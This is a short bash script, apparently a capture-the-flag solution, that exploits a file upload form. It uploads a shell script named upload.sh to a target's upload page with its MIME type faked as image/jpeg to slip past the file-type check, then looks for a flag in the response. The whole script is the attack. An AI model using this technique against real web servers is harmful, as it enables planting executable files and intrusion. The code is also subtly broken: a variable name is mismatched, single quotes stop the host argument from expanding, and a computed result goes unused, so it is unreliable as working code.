#!/bin/bash

url='http://$1/index.php?page=upload#'
contentType='Content-Type: multipart/form-data'
fileToUpload='uploaded=@upload.sh;type=image/jpeg'

req=$(curl -X POST -H ${ContentType} -F 'Upload=submit' -F ${fileToUpload} ${url} --silent)
res=$(echo ${req} | grep -oE 'The flag is : [[:alnum:]]{1,100}')
echo ${req}